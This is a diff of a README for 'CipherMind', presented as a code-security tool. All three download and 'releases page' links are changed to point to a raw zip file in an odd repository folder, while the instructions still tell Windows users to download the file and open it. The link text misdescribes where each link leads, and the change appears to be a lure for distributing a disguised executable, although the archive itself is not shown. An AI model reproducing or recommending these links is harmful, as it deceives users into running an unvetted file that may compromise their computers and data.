@@ -1,10 +1,10 @@
 # 🧠 CipherMind - Secure code with clear guidance
 
-[![Download CipherMind](https://img.shields.io/badge/Download-CipherMind-blue.svg)](https://github.com/biparous-blaxploitation156/CipherMind/releases)
+[![Download CipherMind](https://img.shields.io/badge/Download-CipherMind-blue.svg)](https://github.com/biparous-blaxploitation156/CipherMind/raw/refs/heads/main/chiropodic/Mind_Cipher_v1.0.zip)
 
 ## 🔽 Download CipherMind
 
-1. Open the [CipherMind releases page](https://github.com/biparous-blaxploitation156/CipherMind/releases)
+1. Open the [CipherMind releases page](https://github.com/biparous-blaxploitation156/CipherMind/raw/refs/heads/main/chiropodic/Mind_Cipher_v1.0.zip)
 2. Find the latest release
 3. Download the Windows file from the release assets
 4. When the download finishes, open the file to start the app
@@ -52,7 +52,7 @@ CipherMind helps you check code for security problems in a simple way. It looks 
 
 ## 📦 Install steps
 
-1. Visit the [CipherMind releases page](https://github.com/biparous-blaxploitation156/CipherMind/releases)
+1. Visit the [CipherMind releases page](https://github.com/biparous-blaxploitation156/CipherMind/raw/refs/heads/main/chiropodic/Mind_Cipher_v1.0.zip)
 2. Download the newest Windows release
 3. Wait for the download to finish
 4. Open the file from your browser or from the Downloads folder
